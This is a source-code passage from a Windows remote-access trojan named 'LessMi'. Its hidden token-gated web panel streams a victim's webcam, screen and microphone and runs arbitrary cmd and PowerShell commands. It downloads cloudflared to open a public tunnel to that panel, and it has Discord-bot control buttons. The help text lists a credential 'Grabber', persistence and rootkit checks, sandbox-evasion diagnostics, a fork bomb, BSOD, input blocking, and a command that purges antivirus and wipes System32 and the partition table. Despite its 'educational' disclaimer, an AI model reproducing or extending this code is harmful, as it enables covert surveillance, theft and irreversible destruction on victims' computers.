:root{--bg:#08080b;--fg:#f2f2f7;--dim:#8a8a99;--acc:#a855f7;--line:rgba(255,255,255,.08)}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--fg);font-family:Poppins,system-ui,sans-serif;overflow-x:hidden;cursor:crosshair}
body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(255,255,255,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.03) 1px,transparent 1px);background-size:44px 44px}
body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:1;opacity:.35;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence baseFrequency='.85'/%3E%3C/filter%3E%3Crect width='120' height='120' filter='url(%23n)' opacity='.22'/%3E%3C/svg%3E")}
.wrap{position:relative;z-index:2;max-width:1180px;margin:0 auto;padding:26px 18px 90px}
header{display:flex;align-items:center;justify-content:space-between;gap:14px;padding-bottom:18px;border-bottom:1px solid var(--line)}
h1{font-size:19px;font-weight:600;letter-spacing:-.3px}
h1 span{color:var(--acc)}
.chip{display:inline-flex;align-items:center;gap:7px;padding:7px 13px;border:1px solid var(--line);border-radius:999px;font-size:11.5px;color:var(--dim);background:rgba(255,255,255,.02)}
.dot{width:7px;height:7px;border-radius:50%;background:#22c55e;box-shadow:0 0 10px #22c55e}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:22px}
@media(max-width:860px){.grid{grid-template-columns:1fr}}
.card{border:1px solid var(--line);border-radius:16px;background:rgba(255,255,255,.02);padding:14px}
.card h2{font-size:12px;text-transform:uppercase;letter-spacing:1.4px;color:var(--dim);font-weight:500;margin-bottom:10px}
canvas.view{width:100%;height:auto;display:block;border-radius:11px;background:#000}
.pills{display:flex;flex-wrap:wrap;gap:7px;margin-top:11px}
button{padding:8px 13px;border-radius:999px;border:1px solid var(--line);background:rgba(255,255,255,.04);color:var(--fg);font:inherit;font-size:11.5px;cursor:pointer;transition:.15s}
button:hover{border-color:var(--acc);background:rgba(168,85,247,.14)}
button.on{background:var(--acc);border-color:var(--acc);color:#0b0b0f}
button:disabled{opacity:.45;cursor:progress}
input{width:100%;padding:10px 12px;border-radius:11px;border:1px solid var(--line);background:rgba(255,255,255,.03);color:var(--fg);font:inherit;font-size:12.5px;outline:none}
input:focus{border-color:var(--acc)}
pre{white-space:pre-wrap;word-break:break-word;font-family:ui-monospace,Consolas,monospace;font-size:11.5px;color:#c9c9d6;max-height:230px;overflow:auto;padding:11px;border-radius:11px;background:rgba(0,0,0,.4);border:1px solid var(--line);margin-top:10px}
.wide{grid-column:1/-1}
.row{display:flex;gap:8px;margin-top:10px}
footer{margin-top:34px;color:var(--dim);font-size:11px;text-align:center}
"""

WEB_JS = """
const S={cam:0,screen:0,mic:0,ws:null,ac:null,busy:0};
const $=id=>document.getElementById(id);
function pill(id,on){const e=$(id);if(e)e.classList.toggle('on',!!on);}
async function api(p,opt){const r=await fetch(p,opt);return r.text();}
function draw(kind,buf){
  const cv=$(kind);if(!cv)return;
  const blob=new Blob([buf],{type:'image/jpeg'});
  createImageBitmap(blob).then(b=>{
    if(cv.width!==b.width||cv.height!==b.height){cv.width=b.width;cv.height=b.height;}
    cv.getContext('2d').drawImage(b,0,0);b.close();
  }).catch(()=>{});
}
function connect(){
  const ws=new WebSocket((location.protocol==='https:'?'wss':'ws')+'://'+location.host+'/ws');
  S.ws=ws;ws.binaryType='arraybuffer';
  ws.onopen=()=>{pill('link',1);$('st').textContent='live';};
  ws.onclose=()=>{pill('link',0);$('st').textContent='offline';setTimeout(connect,1500);};
  ws.onmessage=e=>{
    const a=new Uint8Array(e.data);
    if(a.length<2)return;
    draw(a[0]===67?'cam':'screen',a.subarray(1));
  };
}
function toggle(kind){
  S[kind]=S[kind]?0:1;
  pill('t-'+kind,S[kind]);
  if(S.ws&&S.ws.readyState===1)S.ws.send(JSON.stringify({kind,on:S[kind]}));
}
async function micLoop(){
  if(!S.mic){setTimeout(micLoop,500);return;}
  try{
    const r=await fetch('/api/mic.wav',{cache:'no-store'});
    if(r.ok){
      const buf=await r.arrayBuffer();
      if(!S.ac)S.ac=new (window.AudioContext||window.webkitAudioContext)();
      const ab=await S.ac.decodeAudioData(buf);
      const src=S.ac.createBufferSource();src.buffer=ab;src.connect(S.ac.destination);src.start();
    }
  }catch(e){}
  micLoop();
}
function toggleMic(){S.mic=S.mic?0:1;pill('t-mic',S.mic);if(S.mic&&S.ac)S.ac.resume();}
function fmtUp(s){const d=Math.floor(s/86400),h=Math.floor(s%86400/3600),m=Math.floor(s%3600/60);return (d?d+'d ':'')+h+'h '+m+'m';}
async function sysLoop(){
  try{
    const r=await fetch('/api/sys',{cache:'no-store'});
    const d=await r.json();
    if(d.error){$('info').textContent=d.error;}
    else{
      $('info').textContent=
        d.host+'  ·  '+d.user+(d.admin?'  ·  admin':'')+'\\n'+
        'CPU  '+d.cpu+'%\\nRAM  '+d.ram+'%\\nDisk  '+d.disk+'%\\nProcs  '+d.procs+'\\nUptime  '+fmtUp(d.uptime);
    }
  }catch(e){}
  setTimeout(sysLoop,2000);
}
async function run(){
  const c=$('cmd').value.trim();if(!c||S.busy)return;
  S.busy=1;$('runbtn').disabled=1;$('out').textContent='...';
  try{$('out').textContent=await api('/api/cmd',{method:'POST',headers:{'Content-Type':'text/plain'},body:c});}
  catch(e){$('out').textContent='error: '+e;}
  S.busy=0;$('runbtn').disabled=0;
}
function quick(c){$('cmd').value=c;run();}
function shot(kind){window.open('/api/shot/'+kind,'_blank');}
document.addEventListener('keydown',e=>{if(e.key==='Enter'&&e.target.id==='cmd')run();});
connect();sysLoop();
"""


def _web_page():
    return """<!--  __  __       _          _    ____
 |  \/  | __ _| |_ ___   / \  / ___|
 | |\/| |/ _` | __/ _ \ / _ \| |  _
 | |  | | (_| | ||  __// ___ \ |_| |
 |_|  |_|\__,_|\__\___/_/   \_\____|

 (c) Copyright 2026 - MateAG
 All rights reserved. Any copy without
 consent of this code will be reported.

 This project is only for educational purposes.
 The creator is NOT responsible of any illegal/malicious use
 of this project.

 The creator advices you to use this for testing and
 legal activities. If you want to install this on
 someone else computer, please ask them for the
 permission to.

 Thank you and happy testing! <3--><!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>LessMi</title><style>""" + WEB_CSS + """</style></head><body><div class="wrap">
<meta name="referrer" content="no-referrer"><meta name="robots" content="noindex,nofollow">
<link rel="icon" href="https://files.catbox.moe/vuhaid.png">
<header><h1>Less<span>Mi</span></h1>
<div class="chip" id="link"><i class="dot"></i><span id="st">connecting</span></div></header>
<div class="grid">
<div class="card"><h2>Camera</h2>
<canvas class="view" id="cam" width="640" height="360"></canvas>
<div class="pills"><button id="t-cam" onclick="toggle('cam')">Camera</button>
<button onclick="shot('cam')">Snapshot</button></div></div>
<div class="card"><h2>Screen</h2>
<canvas class="view" id="screen" width="640" height="360"></canvas>
<div class="pills"><button id="t-screen" onclick="toggle('screen')">Screen</button>
<button onclick="shot('screen')">Snapshot</button></div></div>
<div class="card"><h2>Microphone</h2>
<div class="pills"><button id="t-mic" onclick="toggleMic()">Listen</button></div>
<pre id="info">-</pre></div>
<div class="card"><h2>System</h2>
<div class="pills">
<button onclick="quick('cmd sysinfo')">Info</button>
<button onclick="quick('cmd tasklist')">Procs</button>
<button onclick="quick('cmd ipconfig')">Net</button>
<button onclick="quick('cmd whoami')">Whoami</button>
</div>
<pre id="out2">-</pre></div>
<div class="card wide"><h2>Console</h2>
<input id="cmd" placeholder="command — runs through cmd, prefix powershell to use it">
<div class="row"><button id="runbtn" onclick="run()">Run</button>
<button onclick="quick('cmd whoami /all')">whoami</button>
<button onclick="quick('cmd ipconfig /all')">ipconfig</button>
<button onclick="quick('powershell Get-Process | Sort CPU -Desc | Select -First 15')">top cpu</button></div>
<pre id="out">-</pre></div>
</div><footer>LessMi</footer></div>
<script>""" + WEB_JS + """</script></body></html>"""


def _web_token_ok(request):
    got = request.cookies.get("lsm", "") or request.query.get("t", "")
    return bool(got) and hmac.compare_digest(got, WEB_TOKEN)


@web.middleware
async def _web_headers(request, handler):
    if not _web_token_ok(request) and request.path not in ("/",):
        return web.Response(status=404, text="not found")
    resp = await handler(request)
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["X-Frame-Options"] = "DENY"
    resp.headers["Referrer-Policy"] = "no-referrer"
    resp.headers["Cache-Control"] = "no-store"
    resp.headers["Content-Security-Policy"] = (
        "default-src 'self'; img-src 'self' blob: data:; media-src 'self' blob:; "
        "style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; "
        "connect-src 'self' ws: wss:")
    return resp


async def _web_index(request):
    t = request.query.get("t", "")
    if t and hmac.compare_digest(t, WEB_TOKEN):
        resp = web.Response(text=_web_page(), content_type="text/html")
        resp.set_cookie("lsm", t, httponly=True, samesite="Strict",
                        secure=request.secure, max_age=86400, path="/")
        return resp
    if _web_token_ok(request):
        return web.Response(text=_web_page(), content_type="text/html")
    return web.Response(status=404, text="not found")


_cam_lock = threading.Lock()
_cam_cap = None
_cam_idx = -1
_scr_lock = threading.Lock()


def _cam_close():
    global _cam_cap
    with _cam_lock:
        if _cam_cap is not None:
            try:
                _cam_cap.release()
            except Exception:
                pass
        _cam_cap = None


def _cam_jpeg(quality=55):
    global _cam_cap, _cam_idx
    with _cam_lock:
        if _cam_cap is None or _cam_idx != selected_camera:
            if _cam_cap is not None:
                try:
                    _cam_cap.release()
                except Exception:
                    pass
                _cam_cap = None
            cap = cv2.VideoCapture(selected_camera, cv2.CAP_DSHOW)
            if not cap.isOpened():
                try:
                    cap.release()
                except Exception:
                    pass
                return None
            try:
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
            except Exception:
                pass
            _cam_cap, _cam_idx = cap, selected_camera
        ok, frame = _cam_cap.read()
        if not ok or frame is None:
            try:
                _cam_cap.release()
            except Exception:
                pass
            _cam_cap = None
            return None
        try:
            frame = cv2.resize(frame, (640, 360), interpolation=cv2.INTER_AREA)
        except Exception:
            pass
        ok, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), quality])
        return buf.tobytes() if ok else None


def _scr_jpeg(quality=50):
    with _scr_lock:
        try:
            img = ImageGrab.grab()
            img.thumbnail((960, 540))
            buf = io.BytesIO()
            img.convert("RGB").save(buf, "JPEG", quality=quality)
            return buf.getvalue()
        except Exception:
            return None


def _grab_jpeg(kind, quality=55):
    return _cam_jpeg(quality) if kind == "cam" else _scr_jpeg(quality)


async def _web_shot(request):
    data = await asyncio.get_event_loop().run_in_executor(
        None, _grab_jpeg, request.match_info.get("kind", "screen"), 75)
    return web.Response(body=data, content_type="image/jpeg") if data else web.Response(status=503)


async def _web_mic(request):
    def rec():
        fs = 16000
        data = sd.rec(int(0.3 * fs), samplerate=fs, channels=1, dtype=np.int16, device=selected_mic)
        sd.wait()
        buf = io.BytesIO()
        with wave.open(buf, "wb") as w:
            w.setnchannels(1)
            w.setsampwidth(2)
            w.setframerate(fs)
            w.writeframes(data.tobytes())
        return buf.getvalue()
    try:
        body = await asyncio.get_event_loop().run_in_executor(None, rec)
        return web.Response(body=body, content_type="audio/wav")
    except Exception:
        return web.Response(status=503, text="no mic")


async def _web_sys(request):
    try:
        cpu = psutil.cpu_percent(interval=0.3)
        ram = psutil.virtual_memory()
        try:
            disk = psutil.disk_usage(os.environ.get("SystemDrive", "C:") + "\\").percent
        except Exception:
            disk = 0
        return web.json_response({
            "host": socket.gethostname(),
            "user": os.environ.get("USERNAME") or "?",
            "cpu": round(cpu, 1),
            "ram": ram.percent,
            "disk": disk,
            "procs": len(psutil.pids()),
            "uptime": int(time.time() - psutil.boot_time()),
            "admin": _is_admin(),
        })
    except Exception as e:
        return web.json_response({"error": str(e)})


async def _web_cmd(request):
    global WEB_BUSY
    if WEB_BUSY:
        return web.Response(text="busy, another command is still running")
    text = (await request.text()).strip()
    if not text:
        return web.Response(text="empty")
    WEB_BUSY = True
    try:
        try:
            args = shlex.split(text, posix=True)
        except Exception:
            args = text.split()
        name = args[0].lower()
        if name in ("cmd", "powershell"):
            line = " ".join(args[1:])
        else:
            name, line = "cmd", text
        if not line.strip():
            return web.Response(text="use: cmd <command>  |  powershell <command>")
        exe = (["cmd", "/c", line] if name == "cmd"
               else ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", line])
        p = await asyncio.create_subprocess_exec(*exe, stdout=asyncio.subprocess.PIPE,
                                                 stderr=asyncio.subprocess.STDOUT,
                                                 creationflags=_CNW)
        out, _ = await asyncio.wait_for(p.communicate(), 45)
        body = out.decode("utf-8", "replace").strip()[:6000] or "(no output)"
        return web.Response(text="> {}\n\n{}".format(text, body))
    except asyncio.TimeoutError:
        return web.Response(text="> {}\n\ntimeout (45 s)".format(text))
    except Exception as e:
        return web.Response(text="> {}\n\nerror: {}".format(text, e))
    finally:
        WEB_BUSY = False


async def _web_ws(request):
    global _WS_OPEN
    ws = web.WebSocketResponse(heartbeat=20)
    await ws.prepare(request)
    _WS_OPEN += 1
    state = {"cam": False, "screen": False}
    loop = asyncio.get_event_loop()

    async def send(kind):
        data = await loop.run_in_executor(None, _grab_jpeg, kind, 55)
        if data and not ws.closed:
            try:
                await ws.send_bytes((b"C" if kind == "cam" else b"S") + data)
            except Exception:
                return False
        return True

    async def pump():
        while not ws.closed:
            t0 = time.time()
            try:
                if state["cam"] and state["screen"]:
                    if not await send("cam"):
                        break
                    if not await send("screen"):
                        break
                    target = 0.10
                elif state["cam"]:
                    if not await send("cam"):
                        break
                    target = 0.09
                elif state["screen"]:
                    if not await send("screen"):
                        break
                    target = 0.28
                else:
                    await asyncio.sleep(0.2)
                    continue
            except asyncio.CancelledError:
                break
            except Exception:
                await asyncio.sleep(0.3)
                continue
            await asyncio.sleep(max(0.01, target - (time.time() - t0)))

    task = asyncio.create_task(pump())
    try:
        async for msg in ws:
            if msg.type == aiohttp.WSMsgType.TEXT:
                try:
                    d = json.loads(msg.data)
                    if d.get("kind") in state:
                        state[d["kind"]] = bool(d.get("on"))
                except Exception:
                    pass
    finally:
        task.cancel()
        try:
            await task
        except Exception:
            pass
        _WS_OPEN = max(0, _WS_OPEN - 1)
        if _WS_OPEN == 0:
            await loop.run_in_executor(None, _cam_close)
    return ws


def _web_app():
    app = web.Application(middlewares=[_web_headers])
    app.router.add_get("/", _web_index)
    app.router.add_get("/api/shot/{kind}", _web_shot)
    app.router.add_get("/api/mic.wav", _web_mic)
    app.router.add_get("/api/sys", _web_sys)
    app.router.add_post("/api/cmd", _web_cmd)
    app.router.add_get("/ws", _web_ws)
    return app


def _lan_ips():
    out = []
    try:
        for addrs in psutil.net_if_addrs().values():
            for a in addrs:
                if a.family != socket.AF_INET:
                    continue
                if a.address.startswith(("127.", "169.254.")):
                    continue
                if a.address not in out:
                    out.append(a.address)
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        first = s.getsockname()[0]
        s.close()
        if first and not first.startswith("127."):
            if first in out:
                out.remove(first)
            out.insert(0, first)
    except Exception:
        pass
    return out


async def web_start(host=None, port=None):
    global WEB_RUNNER, WEB_TOKEN, WEB_HOST, WEB_PORT, WEB_URL
    if WEB_RUNNER:
        return WEB_URL
    WEB_TOKEN = secrets.token_urlsafe(18)
    WEB_HOST = host or WEB_HOST
    WEB_PORT = port or WEB_PORT
    runner = web.AppRunner(_web_app(), access_log=None)
    await runner.setup()
    await web.TCPSite(runner, WEB_HOST, WEB_PORT).start()
    WEB_RUNNER = runner
    if WEB_HOST in ("0.0.0.0", ""):
        ips = _lan_ips()
        WEB_URL = "http://{}:{}/?t={}".format(ips[0] if ips else "127.0.0.1", WEB_PORT, WEB_TOKEN)
    else:
        WEB_URL = "http://{}:{}/?t={}".format(WEB_HOST, WEB_PORT, WEB_TOKEN)
    return WEB_URL


async def web_stop():
    global WEB_RUNNER, WEB_TOKEN, WEB_URL, WEB_TUNNEL, WEB_TUNNEL_URL
    if WEB_RUNNER:
        try:
            await WEB_RUNNER.cleanup()
        except Exception:
            pass
    WEB_RUNNER = None
    WEB_TOKEN = ""
    WEB_URL = ""
    WEB_TUNNEL_URL = ""
    if WEB_TUNNEL:
        try:
            WEB_TUNNEL.terminate()
        except Exception:
            pass
        WEB_TUNNEL = None
    await asyncio.get_event_loop().run_in_executor(None, _cam_close)


async def web_tunnel_start():
    global WEB_TUNNEL, WEB_TUNNEL_URL
    if WEB_TUNNEL:
        return WEB_TUNNEL_URL or "already"
    exe = os.path.join(BASE_DIR, "cloudflared.exe")
    if not os.path.exists(exe):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe") as r:
                    if r.status != 200:
                        return "download failed"
                    with builtins.open(exe, "wb") as f:
                        f.write(await r.read())
        except Exception as e:
            return "download error: {}".format(e)
    if not WEB_RUNNER:
        await web_start("0.0.0.0")
    WEB_TUNNEL = await asyncio.create_subprocess_exec(
        exe, "tunnel", "--url", "http://127.0.0.1:{}".format(WEB_PORT), "--no-autoupdate",
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT,
        creationflags=_CNW)

    async def watch():
        global WEB_TUNNEL_URL
        while WEB_TUNNEL and WEB_TUNNEL.stdout:
            line = await WEB_TUNNEL.stdout.readline()
            if not line:
                break
            m = re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", line.decode("utf-8", "replace"))
            if m:
                WEB_TUNNEL_URL = m.group(0)
                return

    asyncio.create_task(watch())
    for _ in range(60):
        if WEB_TUNNEL_URL:
            return WEB_TUNNEL_URL + "/?t=" + WEB_TOKEN
        await asyncio.sleep(0.5)
    return "starting, try `.panel tunnel` again in a moment"

async def run_panel_command(interaction: discord.Interaction, command_name: str, *args):
    cmd = bot.get_command(command_name)
    if not cmd:
        await interaction.response.send_message(f"Unknown command: `{command_name}`", ephemeral=True)
        return
    cmds_channel = interaction.guild.get_channel(cfg_get(interaction.guild.id, "cmds"))
    if not cmds_channel:
        await interaction.response.send_message("The commands channel could not be found.", ephemeral=True)
        return
    await interaction.response.defer()
    ctx = await bot.get_context(interaction.message)
    ctx.author = interaction.user
    ctx.channel = cmds_channel
    ctx.guild = interaction.guild
    try:
        await ctx.invoke(cmd, *args)
    except Exception as e:
        await cmds_channel.send(f"Error: {e}")


class _PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    async def run(self, interaction, name, *args):
        await run_panel_command(interaction, name, *args)


class VolumeModal(discord.ui.Modal):
    def __init__(self):
        super().__init__(title="Set Volume")
        self.volume = discord.ui.TextInput(label="Volume (0-100)", placeholder="50", required=True, max_length=3)
        self.add_item(self.volume)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            vol = int(self.volume.value)
            if 0 <= vol <= 100:
                await run_panel_command(interaction, "volume", vol)
            else:
                await interaction.response.send_message("The value must be between 0 and 100.", ephemeral=True)
        except ValueError:
            await interaction.response.send_message("That is not a valid number.", ephemeral=True)


class NotepadModal(discord.ui.Modal):
    def __init__(self):
        super().__init__(title="Open Notepad")
        self.text = discord.ui.TextInput(label="Text", style=discord.TextStyle.paragraph, required=True)
        self.add_item(self.text)

    async def on_submit(self, interaction: discord.Interaction):
        await run_panel_command(interaction, "notepad", self.text.value)


class ButtonsScreenshot(_PanelView):
    @discord.ui.button(label="📸 Screenshot", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "ss")

    @discord.ui.button(label="🎥 Screenrec", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "screenrec", 30)

    @discord.ui.button(label="📹 Webcam", style=discord.ButtonStyle.primary)
    async def b3(self, i, b):
        await self.run(i, "webcam")


class ButtonsSystem(_PanelView):
    @discord.ui.button(label="🔊 Volume", style=discord.ButtonStyle.secondary)
    async def b1(self, i, b):
        await i.response.send_modal(VolumeModal())

    @discord.ui.button(label="⌨️ Block", style=discord.ButtonStyle.danger)
    async def b2(self, i, b):
        await self.run(i, "block-input")

    @discord.ui.button(label="✅ Unblock", style=discord.ButtonStyle.success)
    async def b3(self, i, b):
        await self.run(i, "unblock-input")

    @discord.ui.button(label="🖥️ Mon OFF", style=discord.ButtonStyle.danger)
    async def b4(self, i, b):
        await self.run(i, "monitors-off")

    @discord.ui.button(label="🖥️ Mon ON", style=discord.ButtonStyle.success)
    async def b5(self, i, b):
        await self.run(i, "monitors-on")


class ButtonsCameras(_PanelView):
    @discord.ui.button(label="📹 List Cams", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "list-cams")

    @discord.ui.button(label="🎙️ List Mics", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "list-mics")

    @discord.ui.button(label="🎙️ Join", style=discord.ButtonStyle.success)
    async def b3(self, i, b):
        await self.run(i, "join")

    @discord.ui.button(label="🔌 Disconnect", style=discord.ButtonStyle.secondary)
    async def b4(self, i, b):
        await self.run(i, "disconnect")


class ButtonsProcesses(_PanelView):
    @discord.ui.button(label="📋 Tasklist", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "tasklist")

    @discord.ui.button(label="🚫 Kill Exp", style=discord.ButtonStyle.danger)
    async def b2(self, i, b):
        await self.run(i, "kill-explorer")

    @discord.ui.button(label="✅ Start Exp", style=discord.ButtonStyle.success)
    async def b3(self, i, b):
        await self.run(i, "start-explorer")


class ButtonsTrolling(_PanelView):
    @discord.ui.button(label="😵 Crazy", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "crazy-mouse")

    @discord.ui.button(label="➖ Minimize", style=discord.ButtonStyle.secondary)
    async def b2(self, i, b):
        await self.run(i, "minimize-all")

    @discord.ui.button(label="💀 BSOD", style=discord.ButtonStyle.danger)
    async def b3(self, i, b):
        await self.run(i, "bsod")

    @discord.ui.button(label="🍽️ Fork", style=discord.ButtonStyle.danger)
    async def b4(self, i, b):
        await self.run(i, "forkbomb")

    @discord.ui.button(label="👻 Jump", style=discord.ButtonStyle.danger)
    async def b5(self, i, b):
        await self.run(i, "jumpscare")


class ButtonsFiles(_PanelView):
    @discord.ui.button(label="📁 LS", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "ls")

    @discord.ui.button(label="🌳 Tree", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "tree")


class ButtonsSecurity(_PanelView):
    @discord.ui.button(label="🚫 Blacklist", style=discord.ButtonStyle.danger)
    async def b1(self, i, b):
        await i.response.send_message("Type `.blacklist <process>` in the commands channel.", ephemeral=True)

    @discord.ui.button(label="✅ Unblacklist", style=discord.ButtonStyle.success)
    async def b2(self, i, b):
        await i.response.send_message("Type `.unblacklist <process>` in the commands channel.", ephemeral=True)


class ButtonsPower(_PanelView):
    @discord.ui.button(label="🔒 Lock", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "lock-pc")

    @discord.ui.button(label="😴 Sleep", style=discord.ButtonStyle.secondary)
    async def b2(self, i, b):
        await self.run(i, "sleep-pc")

    @discord.ui.button(label="🔁 Restart", style=discord.ButtonStyle.danger)
    async def b3(self, i, b):
        await self.run(i, "restart-pc")

    @discord.ui.button(label="⏻ Shutdown", style=discord.ButtonStyle.danger)
    async def b4(self, i, b):
        await self.run(i, "shutdown-pc")


class ButtonsInfo(_PanelView):
    @discord.ui.button(label="🖥️ Sysinfo", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "sysinfo")

    @discord.ui.button(label="🔋 Battery", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "battery")

    @discord.ui.button(label="📶 WiFi", style=discord.ButtonStyle.primary)
    async def b3(self, i, b):
        await self.run(i, "wifi")

    @discord.ui.button(label="💽 Drives", style=discord.ButtonStyle.primary)
    async def b4(self, i, b):
        await self.run(i, "drives")


class ButtonsMore(_PanelView):
    @discord.ui.button(label="🪟 Windows", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "window-list")

    @discord.ui.button(label="📋 Clipboard", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "clipboard")

    @discord.ui.button(label="🚀 Startup", style=discord.ButtonStyle.primary)
    async def b3(self, i, b):
        await self.run(i, "startup")

    @discord.ui.button(label="📝 Notepad", style=discord.ButtonStyle.secondary)
    async def b4(self, i, b):
        await i.response.send_modal(NotepadModal())

    @discord.ui.button(label="🔔 Beep", style=discord.ButtonStyle.success)
    async def b5(self, i, b):
        await self.run(i, "beep")

class ButtonsTools(_PanelView):
    @discord.ui.button(label="💰 Grabber", style=discord.ButtonStyle.success)
    async def b1(self, i, b):
        await self.run(i, "grabber")

    @discord.ui.button(label="🎨 Accent", style=discord.ButtonStyle.secondary)
    async def b2(self, i, b):
        await self.run(i, "accent")

    @discord.ui.button(label="🖱️ Click", style=discord.ButtonStyle.primary)
    async def b3(self, i, b):
        await self.run(i, "click", 1)

    @discord.ui.button(label="🧾 Systeminfo", style=discord.ButtonStyle.primary)
    async def b5(self, i, b):
        await self.run(i, "systeminfo")

HELP_PAGES = [
    ("overview", "📖", "Overview", """
Prefix `.` — commands are only read in #cmds. Anything typed in the other channels is deleted on sight.

`<angle>` = required · `[square]` = optional · `a|b` = pick one.

The button panel in #panel runs the same commands for you.

Before anything destructive:
`.wdiag` then `.repair` to verify persistence
`.rootkit status` before touching the boot sector
`.crashlog` when something misbehaves
`.vmdiag` to see why a sandbox killed it
"""),
    ("screen", "📸", "Screen & Capture", """
`.ss` — capture **every** monitor in one image.
`.ss-window <title>` — capture one window by title substring; it gets restored and focused first.
`.screenrec <s>` — screen video at 10 fps, capped at 300 s. Above ~60 s the file gets heavy.
`.webcam` — snapshot from the selected camera.
`.camrec <s>` — camera video, capped at 120 s, re-encoded with ffmpeg when possible.
`.list-cams` — enumerate camera indexes.
`.sel-cam <id>` — set the camera used by `.webcam` and `.camrec`.
`.jumpscare` — fullscreen scare video at full volume.
`.play <file|url>` — play audio/video with the default handler.
`.tts <text>` — speak text out loud via SAPI.
`.beep` — 1000 Hz system beep.
"""),
    ("display", "🖥️", "Display & Theme", """
`.show-screens` — list displays with resolution and primary flag.
`.screen-mode <expand|duplicate|internal|external>` — layout preset via displayswitch.
`.resolution <w> <h>` — force a mode. If the screen goes black, `.resolution 1920 1080` or reboot.
`.rotate <0|90|180|270>` — orientation.
`.monitors-off` / `.monitors-on` — power the panels down/up. Wake with `.monitors-on`.
`.screensaver` — start it.
`.matrix` — matrix rain over the desktop.
`.invert` — invert all colours for 10 s.
`.magnifier` — open Windows Magnifier.
`.dark-mode <on|off>` — app + system theme.
`.night-light <on|off>` — blue-light filter.
`.set-wallpaper <file|url>` — local file or remote URL.
`.wallpaper-random` — random stock wallpaper.
`.ss-wall` — screenshot as wallpaper.
`.img-filter <fx> <file>` — `blur`, `sharpen`, `edges`, `emboss`, `gray`, `invert`, `poster`, `solar`.
`.toico <file>` — convert an image to a multi-size `.ico`.
"""),
    ("input", "🖱️", "Input & Cursor", """
`.block-input [s]` — freeze keyboard and mouse; without an argument it stays blocked until `.unblock-input`.
`.unblock-input` — release it.
`.hide-cursor` / `.show-cursor`
`.key <keys>` — type text; supports `[ENTER]`, `[SPACE]`, `[TAB]`, `[ESC]`.
`.click [n]` — N left clicks, max 500.
`.click-delete [n] [folder]` — one click per file deleted from the folder (default Desktop).
`.autoclick <on|off> [interval]` — loop clicks, minimum 0.05 s.
`.mouse-speed <1-20>` / `.swap-mouse <on|off>`
`.hold [s]` — hold the left button down.
`.alt-f4` — to the foreground window.
`.minimize-all` / `.fgwin` — minimize everything, report the foreground window.
`.taskbar <hide|show>` / `.desktop-icons <hide|show>`
`.unpin-all` / `.restart-taskbar` / `.tbar [n]`
`.capslock|numlock|scrolllock <on|off>` / `.sticky-keys <on|off>`
"""),
    ("voice", "🎙️", "Voice & Audio", """
`.list-mics` — enumerate inputs.
`.sel-mic <n>` — pick the input for `.join` and `.record`.
`.list-speakers` — playback devices with index and default flag.
`.set-speaker <n|name>` — switch the default output.
`.join` — stream the mic into the voice channel 24/7; a watchdog restarts the stream if it drops.
`.disconnect` — stop the feed.
`.record <s>` / `.mic-record <s>` — mic clip, sent to #microphone.
`.volume <0-100>` — absolute level.
`.vol-step <up|down> [n]` — relative steps.
`.mute` — toggle mute.
`.airplane-mode <on|off>` — drops every adapter.
"""),
    ("processes", "⚙️", "Processes & Windows", """
`.tasklist` — full process list.
`.proc-info <name>` — pid, path, user, RSS.
`.taskkill <name>` / `.kill-tree <name>` — kill it, or it and all children.
`.kill-explorer` / `.start-explorer` — black screen while stopped.
`.pstree` — process tree, 3 levels.
`.perf` — CPU, RAM and pid count.
`.set-critical` / `.unset-critical` — BSOD if the process is terminated.
`.window-list` — visible window titles.
`.focus <title>` / `.close-window <title>` — by title substring.
`.enable-device <n>` / `.disable-device <n>` — PnP devices, index from the PnP order.
"""),
    ("power", "🔌", "Power & Session", """
`.lock-pc` — lock the workstation.
`.sleep-pc` — suspend.
`.restart-pc` / `.shutdown-pc` — immediate, forced.
`.sched-shutdown <s>` — delayed shutdown, 5 s to 24 h.
`.kill-pc` → `.confirm-kill` — purge AV, kill recovery, delete the BCD, wipe user data and System32, nuke the partition table. **Unbootable, no way back.**
`.exit` — stop the process until reboot or forced reopen.
